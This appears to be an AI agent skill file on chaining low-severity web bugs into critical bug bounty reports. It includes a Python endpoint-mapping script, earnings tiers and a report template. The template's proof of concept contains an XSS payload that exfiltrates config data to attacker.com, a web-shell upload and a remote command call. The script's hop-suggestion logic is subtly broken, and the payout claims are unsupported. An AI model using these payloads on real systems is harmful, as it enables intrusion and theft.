---
name: bug-chain-builder
description: Chain multiple low-severity bugs into critical impact for maximum bounty payouts. Use when combining vulnerabilities,
  escalating impact, or when a single bug isn't enough for a high-severity report.
domain: cybersecurity
tags:
- bug
- builder
- chain
- cybersecurity
- security
- threat-defense
- money
---

# Bug Chain Builder

## Overview

Most bug bounty hunters pile up $500 findings — stored XSS here, IDOR there, a missing rate limit. Each one pays peanuts. The Bug Chain Builder turns $500 into $5,000 by connecting the dots: one bug is an informercial, three bugs are a break-in sequence.

Bug chaining is the art of combining multiple low-severity (or "informative") vulnerabilities into a single critical-impact exploit chain. A reflected XSS on an admin panel that's only accessible internally? Useless alone. But pair it with a subdomain takeover on the internal tools domain and a leaked SSRF, and you have a remote code execution chain that earns a critical payout.

This skill teaches systematic chain hunting: endpoint dependency mapping, privilege escalation path analysis, data flow tracing, and proof-of-concept assembly. You will learn to identify how individual weaknesses compose into attacks that bypass every single control in isolation but fail when combined.

## When to Use

**Trigger phrases:**
- "bug chain builder"
- "Found a low-severity bug that feels 'not impactful enough'"
- "Need to escalate impact for a higher bounty"
- "Multiple findings on the same target that could combine"
- Report marked as "informative" — chain it to critical
- Want to maximize payout from a single target
- Found an IDOR but it only leaks low-sensitivity data
- Discovered a feature that trusts data from another feature
- "This CORS misconfiguration isn't exploitable alone"

## When NOT to Use

- When you lack proper authorization for testing
- For production systems without change management
- When the task requires legal or compliance expertise beyond technical scope
- When each individual bug has already been independently patched — find new chains
- When chaining requires social engineering or physical access outside scope
- When the target has no interconnected features to chain through

## Money-Making Overview

**Target Buyer:** Bug bounty programs (HackerOne, Bugcrowd, Intigriti, private programs), penetration testing clients, and security teams needing impact-based severity assessments.

**How You Make Money:**
1. **Bug Chain Reports** — Submit chained exploits to bounty programs earning critical-severity bounties instead of low-severity triage ($500-5K per chain)
2. **Chain Consulting** — Teach pentest teams and bug hunters how to identify chainable weaknesses in their targets ($1,000-3K per engagement)
3. **Chain Validation Service** — Review existing pentest findings and produce escalation POCs showing how "informative" issues actually compose into critical exploits ($750-2K per review)

### Service Tiers

| Tier | Price | What They Get |
|------|-------|---------------|
| **Basic** — Chain Discovery | $500 | One-target chain hunt report with up to 3 chained vulnerabilities, dependency graph, and POC for the critical path |
| **Pro** — Full Chain Exploitation | $2,000 | Deep chain analysis of up to 3 targets, full dependency mapping, multi-step POC with scripts, replayable exploit chain, and bounty submission template |
| **Enterprise** — Chain Program | $5,000+/mo | Ongoing chain discovery for a company's entire bug bounty program, chain hunting playbooks customized to their stack, and monthly escalation reviews |

**Expected First Dollar:** 2-4 weeks (first chain submission to a bounty program; payouts depend on triage speed)

## First Action in 60 Minutes

Create a bug chain dependency graph from an API endpoint list. This script crawls the target's documented and discovered endpoints, maps request/response parameter flows, and identifies where one endpoint's output becomes another's input — the foundation of every bug chain.

```python
#!/usr/bin/env python3
"""
chain-discovery.py — Bug Chain Dependency Mapper
Maps endpoint dependencies by tracing parameter flows across an API surface.
Outputs a JSON dependency graph showing chainable paths.
Requires: python3, requests, urllib3 (preinstalled on Kali)
Install: pip3 install requests beautifulsoup4
"""

import json
import sys
import re
import hashlib
from collections import defaultdict
from urllib.parse import urljoin, urlparse, parse_qs
try:
    import requests
except ImportError:
    print("[!] Run: pip3 install requests")
    sys.exit(1)

TARGET = sys.argv[1] if len(sys.argv) > 1 else None
if not TARGET:
    print("Usage: python3 chain-discovery.py <target-url> [openapi-spec-url]")
    print("       python3 chain-discovery.py https://api.target.com https://api.target.com/openapi.json")
    sys.exit(1)

SPEC_URL = sys.argv[2] if len(sys.argv) > 2 else None

OUTPUT_FILE = f"chain_graph_{hashlib.md5(TARGET.encode()).hexdigest()[:8]}.json"

def extract_endpoints_from_html(base, html):
    """Scrape endpoints from HTML: look for API docs, JS files, hrefs."""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, 'html.parser')
    endpoints = set()
    # Extract all hrefs
    for a in soup.find_all('a', href=True):
        href = a['href']
        if any(p in href.lower() for p in ['/api/', '/v1/', '/v2/', '/graphql', '/rest/', '/swagger']):
            endpoints.add(urljoin(base, href))
    # Extract potential API paths from script content
    for script in soup.find_all('script'):
        if script.string:
            # Find /api/xxx patterns in JS
            for m in re.finditer(r'["\'](/[a-zA-Z0-9_\-/]+(?:/v[0-9]+)?/[a-zA-Z0-9_\-{}]+)["\']', script.string):
                if '/api/' in m.group(1) or '/rest/' in m.group(1):
                    endpoints.add(urljoin(base, m.group(1)))
    return list(endpoints)

def extract_endpoints_from_openapi(spec_url):
    """Parse OpenAPI spec to extract endpoints, parameters, and response schemas."""
    try:
        r = requests.get(spec_url, timeout=10, headers={"User-Agent": "ChainDiscovery/1.0"})
        if r.status_code != 200:
            return []
        spec = r.json()
    except:
        return []

    endpoints = []
    if 'paths' not in spec:
        return []

    for path, methods in spec['paths'].items():
        for method, details in methods.items():
            if method.upper() not in ('GET', 'POST', 'PUT', 'PATCH', 'DELETE'):
                continue
            params = []
            responses = {}
            if 'parameters' in details:
                for p in details['parameters']:
                    params.append({
                        'name': p.get('name'),
                        'in': p.get('in'),
                        'required': p.get('required', False),
                        'schema': p.get('schema', {})
                    })
            if 'responses' in details:
                for code, resp in details['responses'].items():
                    content = resp.get('content', {})
                    if 'application/json' in content:
                        schema = content['application/json'].get('schema', {})
                        responses[code] = extract_properties(schema)
            endpoints.append({
                'path': path,
                'method': method.upper(),
                'params': params,
                'responses': responses
            })
    return endpoints

def extract_properties(schema):
    """Recursively extract property names from a JSON schema."""
    props = set()
    if 'properties' in schema:
        for name, val in schema['properties'].items():
            props.add(name)
            if val.get('type') == 'object':
                props.update(extract_properties(val))
            if val.get('type') == 'array' and 'items' in val:
                props.update(extract_properties(val.get('items', {})))
    if 'items' in schema and schema.get('type') == 'array':
        props.update(extract_properties(schema['items']))
    return props

def analyze_parameter_flow(endpoints):
    """
    Build dependency graph by analyzing which endpoint outputs become
    another endpoint's inputs (parameter name matching = chainable).
    """
    graph = {
        'nodes': [],
        'edges': [],
        'chains': []
    }

    # Collect all output fields and input params
    output_fields = defaultdict(set)  # endpoint index -> output fields
    input_params = defaultdict(set)   # endpoint index -> input params

    for i, ep in enumerate(endpoints):
        graph['nodes'].append({
            'id': i,
            'method': ep.get('method', 'GET'),
            'path': ep.get('path', ''),
            'label': f"{ep.get('method', 'GET')} {ep.get('path', '')}"
        })
        for code, fields in ep.get('responses', {}).items():
            output_fields[i].update(fields)
        for p in ep.get('params', []):
            input_params[i].add(p.get('name', ''))

    # Find edges: endpoint A's output field matches endpoint B's input param
    for src in range(len(endpoints)):
        for dst in range(len(endpoints)):
            if src == dst:
                continue
            shared = output_fields[src] & input_params[dst]
            if shared:
                graph['edges'].append({
                    'source': src,
                    'target': dst,
                    'shared_fields': list(shared),
                    'risk': 'HIGH' if 'id' in shared or 'token' in shared or 'key' in shared else 'MEDIUM'
                })

    # Trace all chainable paths (depth-first up to 4 hops)
    def dfs(current, path, visited, depth):
        if depth > 4:
            return
        path.append(current)
        if len(path) >= 2:
            chain = {
                'path': [graph['nodes'][n]['label'] for n in path],
                'length': len(path)
            }
            # Score the chain
            risk_score = 0
            for e in graph['edges']:
                if e['source'] == path[-2] and e['target'] == path[-1]:
                    if e['risk'] == 'HIGH':
                        risk_score += 2
                    else:
                        risk_score += 1
            chain['risk_score'] = risk_score
            graph['chains'].append(chain)
        for edge in graph['edges']:
            if edge['source'] == current and edge['target'] not in visited:
                dfs(edge['target'], path[:], visited | {edge['target']}, depth + 1)

    # Start DFS from every node
    for i in range(len(endpoints)):
        dfs(i, [], {i}, 0)

    return graph

def run_live_probe(endpoint, timeout=5):
    """
    Probe an endpoint to discover actual response fields from live data.
    Helps find fields not documented in the spec.
    """
    url = urljoin(TARGET, endpoint.get('path', ''))
    method = endpoint.get('method', 'GET').lower()
    try:
        if method == 'get':
            r = requests.get(url, timeout=timeout, verify=False,
                           headers={"User-Agent": "ChainDiscovery/1.0"})
        elif method == 'post':
            r = requests.post(url, timeout=timeout, verify=False,
                            headers={"User-Agent": "ChainDiscovery/1.0", "Content-Type": "application/json"},
                            json={})
        else:
            return set()
        if r.status_code == 200 and r.headers.get('content-type', '').startswith('application/json'):
            data = r.json()
            return extract_live_fields(data)
    except:
        pass
    return set()

def extract_live_fields(data, prefix=''):
    """Extract field names from live JSON response recursively."""
    fields = set()
    if isinstance(data, dict):
        for k, v in data.items():
            full_key = f"{prefix}.{k}" if prefix else k
            fields.add(full_key)
            if isinstance(v, (dict, list)):
                fields.update(extract_live_fields(v, full_key))
    elif isinstance(data, list) and data:
        fields.update(extract_live_fields(data[0], prefix))
    return fields

def highlight_chainable_patterns(graph):
    """Identify the most promising chains for bug chaining."""
    print("\n[+] HIGH-VALUE CHAIN PATTERNS:")
    print("    (Prioritize these when looking for bugs to chain)")
    print("=" * 60)

    # Filter chains with high risk scores
    scored = sorted(graph['chains'], key=lambda c: c['risk_score'], reverse=True)
    top_chains = [c for c in scored if c['risk_score'] >= 2][:5]

    if not top_chains:
        print("    No automatic high-value chains found from OpenAPI spec alone.")
        print("    Run live probing with --probe or add manual endpoint definitions.")
        return

    for i, chain in enumerate(top_chains, 1):
        print(f"\n  Chain #{i} (score: {chain['risk_score']}):")
        for step in chain['path']:
            print(f"    -> {step}")
        # Suggest bug types for each hop
        print("    Exploit ideas:")
        for j in range(len(chain['path']) - 1):
            hop_src = chain['path'][j]
            hop_dst = chain['path'][j + 1]
            # Find shared fields
            for edge in graph['edges']:
                if edge['source'] == j and edge['target'] == j + 1:
                    for f in edge['shared_fields']:
                        if 'id' in f.lower():
                            print(f"       - IDOR on {hop_src} -> chain into {hop_dst} via {f}")
                        if 'token' in f.lower() or 'key' in f.lower():
                            print(f"       - Token leakage from {hop_src} -> use on {hop_dst} (auth bypass)")
                        else:
                            print(f"       - Parameter pollution: inject malicious {f} from {hop_src} to {hop_dst}")

def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print(f"[*] Bug Chain Discovery on: {TARGET}")
    print(f"[*] Output file: {OUTPUT_FILE}")
    print()

    endpoints = []

    # Phase 1: If we have an OpenAPI spec, parse it
    if SPEC_URL:
        print(f"[1/4] Parsing OpenAPI spec: {SPEC_URL}")
        endpoints = extract_endpoints_from_openapi(SPEC_URL)
        print(f"      Found {len(endpoints)} documented endpoints")
    else:
        print("[1/4] No OpenAPI spec provided; probing root for documentation...")
        try:
            r = requests.get(TARGET, timeout=10,
                           headers={"User-Agent": "ChainDiscovery/1.0"},
                           verify=False)
            endpoints_html = extract_endpoints_from_html(TARGET, r.text)
            for ep_path in endpoints_html:
                endpoints.append({
                    'path': ep_path,
                    'method': 'GET',
                    'params': [],
                    'responses': {}
                })
            print(f"      Found {len(endpoints)} potential endpoints from HTML")
        except:
            print("      Could not fetch target. Try providing an OpenAPI spec URL.")

    if not endpoints:
        print("[!] No endpoints discovered. Provide an OpenAPI spec URL or a target with API docs.")
        sys.exit(1)

    # Phase 2: Live probe to enrich response fields
    print(f"\n[2/4] Live probing {len(endpoints)} endpoints for response fields...")
    for i, ep in enumerate(endpoints):
        live_fields = run_live_probe(ep)
        if live_fields:
            existing = ep.get('responses', {}).get('200', set())
            combined = existing | live_fields
            ep['responses']['200'] = combined
            print(f"      [{i+1}/{len(endpoints)}] {ep['method']} {ep['path']} -> {len(live_fields)} fields")

    # Phase 3: Build dependency graph
    print(f"\n[3/4] Building dependency graph...")
    graph = analyze_parameter_flow(endpoints)
    print(f"      Nodes: {len(graph['nodes'])}")
    print(f"      Edges: {len(graph['edges'])}")
    print(f"      Chainable paths: {len(graph['chains'])}")

    # Phase 4: Analysis
    print(f"\n[4/4] Chain analysis complete.")
    highlight_chainable_patterns(graph)

    # Write output
    output = {
        'target': TARGET,
        'spec_url': SPEC_URL,
        'total_endpoints': len(endpoints),
        'total_chains': len(graph['chains']),
        'top_chain_score': max((c['risk_score'] for c in graph['chains']), default=0),
        'dependency_graph': graph,
        'chain_opportunities': [
            {
                'path': c['path'],
                'score': c['risk_score'],
                'suggested_attack': 'IDOR + XSS chain' if any('id' in p.lower() for p in c['path'])
                    else 'Auth bypass + data leak chain'
            }
            for c in sorted(graph['chains'], key=lambda x: x['risk_score'], reverse=True)[:10]
        ]
    }

    with open(OUTPUT_FILE, 'w') as f:
        json.dump(output, f, indent=2)

    print(f"\n[✓] Chain graph saved to: {OUTPUT_FILE}")
    print(f"\n[>] NEXT STEPS:")
    print(f"    1. Review the chainable paths listed above")
    print(f"    2. Test each hop in the chain for composable bugs")
    print(f"    3. For each shared field, test: IDOR, injection, mass assignment, type confusion")
    print(f"    4. Assemble the full chain POC")
    print(f"    5. Submit as a single critical-severity report")

if __name__ == '__main__':
    main()
```

### How to Run

```bash
# Install dependencies
pip3 install requests beautifulsoup4

# Analyze an API target with an OpenAPI spec
python3 chain-discovery.py https://api.target.com https://api.target.com/openapi.json

# Analyze without spec (HTML/JS scraping from root)
python3 chain-discovery.py https://app.target.com

# Review the chain graph
cat chain_graph_*.json | python3 -m json.tool | less
```

### What You Get

- A JSON dependency graph showing which endpoints feed data to which
- Highlighted chainable paths (parameter flows from output to input)
- Risk-scored chains prioritized by exploit potential
- Specific bug type suggestions for each hop (IDOR, token leakage, parameter pollution)

## Deliverable Format

Every bug chain submission MUST include a proof-of-concept report showing the escalation path from low-severity to critical. Use this template:

```markdown
# Bug Chain Report: [Chain Name]
**Target:** [program/target name]
**Severity:** Critical (chained from [N] low-severity findings)
**Bounty Range Expected:** $[X]-$[Y]

## Chain Summary
[One paragraph describing the overall chain and end impact]
*Example: "A reflective XSS on the admin login page is low severity alone. 
Combined with a subdomain takeover on admin-uploads.target.com and a 
leaked internal API key in the JS bundle, this becomes a full admin account 
takeover affecting all 50K+ users."*

## Individual Bugs in Chain

### Bug 1: [Bug Type] — [Severity: Low/Medium]
- **Location:** [endpoint/page]
- **Description:** [minimal description]
- **Impact alone:** [limited impact]

### Bug 2: [Bug Type] — [Severity: Low/Medium]
- **Location:** [endpoint/page]
- **Description:** [minimal description]
- **Impact alone:** [limited impact]

### Bug 3: [Bug Type] — [Severity: Medium/High]
- **Location:** [endpoint/page]
- **Description:** [minimal description]
- **Impact alone:** [limited impact]

## Chain Analysis: How They Compose

| Step | Action | Bug Used | New Privilege |
|------|--------|----------|---------------|
| 1 | [e.g., Trigger XSS on admin panel] | Bug 1 — Reflected XSS | Session context in victim's browser |
| 2 | [e.g., XSS fetches JS config containing internal API key] | Bug 2 — Secrets in JS | Internal API access |
| 3 | [e.g., Use API key to access internal file upload] | Bug 3 — Missing auth on upload | File write on internal storage |
| 4 | [e.g., Uploaded shell → RCE on internal server] | Chain escalation | Full internal server compromise |

## Proof of Concept

### Prerequisites
- [Tool/access needed]
- [Accounts or data needed]

### Step-by-Step Reproduction

1. **First step:**
   ```http
   GET /admin/login?next=javascript:alert(1) HTTP/1.1
   Host: admin.target.com
   ```
   *Result: XSS fires in admin browser context*

2. **Extract token:**
   ```javascript
   // Payload injected via XSS
   fetch('/admin/config.js').then(r=>r.text()).then(t=>fetch('https://attacker.com/log?'+t))
   ```
   *Result: Internal API key exfiltrated*

3. **Use internal key:**
   ```bash
   curl -H "X-Internal-Key: $LEAKED_KEY" \
        -F "file=@shell.jsp" \
        https://admin-uploads.target.com/upload
   ```
   *Result: Web shell uploaded to internal app server*

4. **Execute commands:**
   ```bash
   curl "https://admin-uploads.target.com/uploads/shell.jsp?cmd=id"
   ```
   *Result: Remote code execution on internal server*

## Impact
[Describe the concrete business impact]
- [Number] affected users
- [Types] of data accessible
- [Business function] compromised

## Remediation
- [Fix for bug 1]
- [Fix for bug 2]
- [Fix for bug 3]
- Architectural: [systemic fix to break the chain]

## Similar Chain Opportunities
[Optional: other chainable patterns observed during testing]
```

## Anti-Rationalization

| Rationalization | Reality |
|---|---|
| "Low severity isn't worth reporting" | Every critical bug started as a low-severity issue someone didn't chain. Programs pay 10-50x more for chained exploits. A $50 XSS + $100 IDOR = $5,000 account takeover. |
| "Chaining is too complex for real targets" | The most common chains use 2-3 bugs with a single shared parameter (user ID, session token, file path). The complexity is in the relationship, not the individual exploit. |
| "If a bug is 'informative' it means it's not exploitable" | "Informative" means it's not exploitable *alone*. Your job is to find the missing piece that makes it critical. Every "informative" finding is a chain waiting to happen. |
| "The triage team will split my chain into separate reports" | Submit the chain as ONE report with a clear escalation narrative. Show that each bug is independently fixable but only the chain demonstrates real risk. Programs want to see the full picture. |
| "I don't have time to chain — better to submit fast" | A single critical report earns more than 10 low-severity ones in both payout and reputation. The time invested in one chain pays back 20x the time spent submitting singles. |
| "My tools don't support chaining analysis" | Chaining doesn't need special tools — it needs a methodology. The chain-discovery.py script above is all you need to start mapping endpoint dependencies. Your brain does the exploitation. |
| "Programs don't reward chaining — they want clean reports" | Most top-tier programs (Google, Meta, Microsoft, GitHub) explicitly reward chained exploits in their bounty ranges. Read their bounty pages — "critical vulnerability chain" is a standard category. |

## Workflow

### Phase 1: Reconnaissance for Chains
1. **Map the attack surface** — Use the chain-discovery.py script to identify all endpoints and their parameter flows.
2. **Identify data relationships** — Trace how data moves between endpoints: which IDs, tokens, and fields created in one endpoint are consumed by another.
3. **Document trust boundaries** — Mark which endpoints run in different privilege contexts (admin vs user, internal vs public, authenticated vs anonymous).

### Phase 2: Individual Bug Discovery
4. **Test each endpoint independently** — Use standard testing (IDOR, XSS, SSRF, injection) on every endpoint.
5. **Catalog all low-severity findings** — Create a spreadsheet with: bug type, endpoint, parameter, impact alone, and the data it touches.
6. **Mark chainable parameters** — Highlight every finding whose affected parameter also appears as input to another endpoint.

### Phase 3: Chain Construction
7. **Build the escalation ladder** — Order bugs by dependency: which bug's output is consumed by the next.
8. **Test each hop** — Verify that Bug 1's exploit creates the conditions needed for Bug 2.
9. **Prove end-to-end** — Demonstrate the full chain from initial access to impact without relying on hypothetical steps.
10. **Document the chain** — Use the deliverable template above.

### Phase 4: Submission
11. **Submit as a single report** — Title: "Critical: [Bug 1] + [Bug 2] + [Bug 3] chain leading to [impact]"
12. **Explain the composition** — In the report summary, clearly state: "Bug 1 alone is low. Bug 2 alone is medium. Together they are critical because..."
13. **Include individual PoCs and the chain PoC** — Show each step independently AND the combined exploit.

### Common Chain Patterns

| Pattern | Bugs Involved | End Result |
|---------|--------------|------------|
| IDOR → Mass Assignment | IDOR on user profile + missing parameter whitelist on admin update | Escalate any user to admin |
| XSS → CSRF Token Leak | Stored XSS on comments + CSRF without token binding on sensitive action | Account takeover on every page visitor |
| Rate Limit Bypass → Credential Stuffing | Missing rate limit on login + no account lockout | Bulk account compromise |
| Subdomain Takeover → Cookie Scope | Orphaned DNS record on subdomain + cookies scoped to *.target.com | Steal session cookies of any visitor |
| Open Redirect → OAuth Token Theft | Open redirect on OAuth callback + missing state parameter + CORS misconfiguration | Steal OAuth tokens and hijack accounts |
| SSRF → Cloud Metadata → Privilege Escalation | SSRF in image upload + cloud metadata endpoint accessible + IAM role with write access | Cloud account compromise |

### Verification Checklist

- [ ] Every low-severity bug documented with exact location and parameters
- [ ] Shared parameters identified across at least 2 endpoints
- [ ] Dependency graph built showing data flow direction
- [ ] Each chain hop tested independently and confirmed working
- [ ] End-to-end chain PoC demonstrated in a repeatable script
- [ ] Business impact calculated (data exposed, users affected, actions possible)
- [ ] Chain report structured with escalation narrative
- [ ] Individual fixes recommended alongside architectural fix
- [ ] Report submitted as a single critical-severity finding

## Tools

- **chain-discovery.py** — Endpoint dependency mapper (provided above)
- **Burp Suite** — Intercept and modify requests across chain hops; use Match and Replace to propagate tokens
- **ffuf** — Fuzz chainable parameters across multiple endpoints simultaneously
- **mitmproxy** — Script-chain requests to automate multi-step PoCs
- **jq** — Parse JSON responses to trace field name consistency between endpoints
- **Postman / Newman** — Build and automate chain sequences as collections
- **Custom Python PoC scripts** — Use the chain dependency graph JSON to auto-generate PoC sequences
